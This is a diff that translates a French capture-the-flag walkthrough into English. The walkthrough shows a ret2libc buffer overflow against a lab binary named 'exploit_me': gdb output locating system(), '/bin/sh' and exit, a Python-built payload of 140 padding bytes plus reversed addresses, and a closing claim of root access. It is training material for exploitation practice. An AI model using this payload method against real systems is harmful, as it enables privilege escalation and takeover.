@@ -33,9 +33,9 @@ ssh zaz@192.168.56.101
 
 
 #### payload
-Recherche des fonctions libc du binaire
+Searching for libc functions in the binary
 
-Pour faire notre payload nous avons besoin de de piocher des fonctions de la libc qui peuvent nous etre utile pour ce dernier.
+To create our payload, we need to select libc functions that may be useful for this purpose.
 
 ```bash
 (gdb) info functions system
@@ -46,8 +46,8 @@ Non-debugging symbols:
 0xb7e6b060  system
 0xf7f48a50  svcerr_systemerr
 ```
-Ok nous avons la fonction system charger de la libc, cette fonction est interessante car system appel bien execve.
-Il nous reste plus qu'a trouver l'arguments de system dans la libc directement l'ideal serrait "/bin/sh"
+Okay, we have the system function from libc. This function is interesting because system calls execve.
+All we have to do now is find the arguments for system in libc directly. Ideally, it would be “/bin/sh.”
 
 ```bash
 (gdb) info proc map
@@ -78,7 +78,7 @@ Mapped address spaces:
 0xf7f897ec:	 "/bin/sh"
 ```
 
-Il nous faut une adresse de retour maintenant nous pouvons prendre par exemple exit.
+We need a return address now we can take exit, for example.
 
 ```bash
 (gdb) info function exit
@@ -114,4 +114,6 @@ cmd = `./exploit_me $(python -c 'print "A"*140 + "\xb7\xe6\xb0\x60"[::-1] + "\xb
 
 ![alt text](images/ret2libc.png)
 
-END
+**Congratulation we are root !**
+
+# END
